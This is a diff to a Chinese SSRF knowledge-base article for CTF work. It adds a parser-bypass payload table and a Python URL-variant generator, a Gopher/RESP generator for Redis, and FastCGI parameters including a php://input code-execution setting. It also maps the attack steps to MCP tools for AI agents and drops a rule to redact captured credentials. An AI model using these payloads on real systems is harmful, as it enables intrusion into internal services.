@@ -14,7 +14,7 @@ keywords: ["SSRF", "Gopher协议", "Redis攻击", "DNS重绑定", "云metadata",
 difficulty: "intermediate"
 tags: ["ssrf", "web-security", "cloud", "injection", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 # SSRF (Server-Side Request Forgery)
@@ -102,6 +102,46 @@ sequenceDiagram
     `http://allowed-domain.com#@127.0.0.1/` 或 `http://allowed-domain.com\@127.0.0.1/`
     根据 RFC 规范的不同，有些解析器视 `#` 或 `\` 后面的部分为 Path 或 Fragment，有些则视其为 Userinfo 标志，从而导致对实际目标的误判。
 
+### B.1 解析器差异打点矩阵
+
+SSRF 过滤通常不是“一个解析器完成所有动作”，而是 `校验 parser`、`跳转 parser`、`HTTP client parser`、`代理 parser` 串在一起。打点时不要只测一个 payload，要把同一目标做成多种等价表示，看哪一层先露出差异。
+
+| 变体 | Payload 形态 | 命中信号 | 常见失败样本 |
+|---|---|---|---|
+| UserInfo | `http://allow.com@127.0.0.1:8080/` | 后端访问 `127.0.0.1`，Host 校验仍显示 `allow.com` | 返回 `400 invalid userinfo` |
+| Fragment | `http://127.0.0.1:8080#@allow.com/` | 校验器只看 `#` 后文本，HTTP client 丢弃 fragment | 服务端先规范化 URL |
+| Backslash | `http://allow.com\@127.0.0.1:8080/` | Java/Node/Go 对 `\` 归一化不同 | WAF 把 `\` 提前替换成 `/` |
+| Encoded slash | `http://allow.com%2f%2f127.0.0.1/` | 校验前后 decode 次数不同 | HTTP client 不二次 decode |
+| Mixed scheme | `http:gopher://127.0.0.1:6379/_...` | 前置正则只匹配 `^http`，下游按第二个 scheme 处理 | 标准 URL parser 拒绝 |
+| IPv4 int | `http://2130706433:8000/` | 正则未覆盖整数 IP | 语言运行时不接受整数 host |
+| IPv4 hex | `http://0x7f000001:8000/` | curl/libc 接受十六进制 | Java `URI` 保持字符串不解析 |
+| IPv6 mapped | `http://[::ffff:127.0.0.1]:8000/` | 过滤器只拦 IPv4 字符串 | 目标服务未监听 IPv6 |
+| DNS wildcard | `http://127.0.0.1.nip.io:8000/` | 域名校验通过，DNS 解析到内网 | 服务端固定解析器禁止公网 DNS |
+
+```python
+from urllib.parse import quote
+
+def ssrf_url_variants(host="127.0.0.1", port=80, allow="example.com", path="/"):
+    base = f"{host}:{port}{path}"
+    raw = [
+        f"http://{base}",
+        f"http://{allow}@{base}",
+        f"http://{allow}\\@{base}",
+        f"http://{base}#@{allow}/",
+        f"http://2130706433:{port}{path}",
+        f"http://0x7f000001:{port}{path}",
+        f"http://017700000001:{port}{path}",
+        f"http://[::ffff:{host}]:{port}{path}",
+        f"http://{host}.nip.io:{port}{path}",
+    ]
+    return raw + [quote(u, safe=":/?&=%#@[]\\") for u in raw]
+
+for u in ssrf_url_variants(port=8080, allow="cdn.example.com"):
+    print(u)
+```
+
+成功标志不要只看状态码：`200` 可能是前置代理页面，`403` 也可能说明已经打到内网服务。优先记录响应头里的 `Server`、错误页框架名、响应时间、连接拒绝/超时差异、目标端口 banner。
+
 ### C. 302 重定向配合
 如果后端对输入的 URL 主机进行了极其严格的域名与 IP 审查，但**开启了 Follow Redirects（跟随重定向）**：
 *   输入：`http://attacker.com/302.php`
@@ -182,6 +222,66 @@ CLOUD_ENDPOINTS = {
 # etcd
 # http://127.0.0.1:2379/v2/keys
 ```
+
+### A. RESP / Gopher Payload 生成器
+
+手写 `%0d%0a` 很容易错长度。先生成 RESP，再做 URL encode；触发 SSRF 的地方如果会先 decode 一次，就把结果再 encode 一次。
+
+```python
+from urllib.parse import quote
+
+def resp(*parts: str) -> bytes:
+    out = [f"*{len(parts)}\r\n".encode()]
+    for part in parts:
+        b = part.encode()
+        out.append(f"${len(b)}\r\n".encode() + b + b"\r\n")
+    return b"".join(out)
+
+def gopher_payload(host: str, port: int, frames: list[bytes], double_encode=False) -> str:
+    raw = b"".join(frames)
+    payload = "_" + quote(raw, safe="")
+    if double_encode:
+        payload = quote(payload, safe="")
+    return f"gopher://{host}:{port}/{payload}"
+
+frames = [
+    resp("PING"),
+    resp("INFO"),
+    resp("QUIT"),
+]
+print(gopher_payload("127.0.0.1", 6379, frames))
+```
+
+Redis 命中样本：
+
+```text
++PONG
+$...
+redis_version:...
+```
+
+失败样本：
+
+```text
+-NOAUTH Authentication required.
+-ERR Protocol error
+```
+
+`NOAUTH` 说明服务打到了，下一步转向弱口令、内网凭据泄露或利用其他协议；`Protocol error` 多半是 CRLF、RESP 长度、Gopher 首字符 `_` 或 encode 次数错了。
+
+### B. FastCGI 打点顺序
+
+PHP-FPM 不是 HTTP，不能直接 `GET /index.php`。要构造 FastCGI record：`FCGI_BEGIN_REQUEST` → 多个 `FCGI_PARAMS` → 空 `FCGI_PARAMS` → `FCGI_STDIN`。CTF 中最容易错的是 `SCRIPT_FILENAME` 和 `DOCUMENT_ROOT` 不匹配。
+
+| 参数 | 作用 | 典型取值 |
+|---|---|---|
+| `SCRIPT_FILENAME` | 要执行的 PHP 文件绝对路径 | `/var/www/html/index.php` |
+| `DOCUMENT_ROOT` | Web 根目录 | `/var/www/html` |
+| `REQUEST_METHOD` | 触发方式 | `POST` |
+| `PHP_VALUE` | 临时 PHP 配置 | `auto_prepend_file=php://input` |
+| `CONTENT_LENGTH` | stdin 字节数 | 与 body 长度完全一致 |
+
+确认路径时先打 `phpinfo()` 或读取错误回显：`Primary script unknown` 表示 FPM 可达但路径错；连接超时表示端口、协议或过滤层还没过。
 
 ---
 
@@ -279,7 +379,6 @@ curl http://metadata.169.254.169.254.nip.io/latest/meta-data/
 # → 第一个请求: GET / HTTP/1.1
 # → 第二个请求: GET /admin HTTP/1.1
 ```
-```
 
 ## MCP 工具映射
 
@@ -291,9 +390,9 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | 知识检索 | `kb_router` | 按 SSRF 攻击信号搜索知识库 |
 | 知识库文件读取 | `kb_read_file` | 读取知识库技术文件内容 |
 
-## 证据与验证闭环
+## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+- 保存 baseline、变体 URL、最终解析 host、响应状态、关键响应头和正文摘要。
+- 对每个命中记录：入口参数、encode 次数、是否跟随 redirect、目标端口、协议 banner、成功响应和失败样本。
+- 记录 DNS rebinding 的解析序列、TTL、两次请求间隔和服务端缓存表现。
+- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
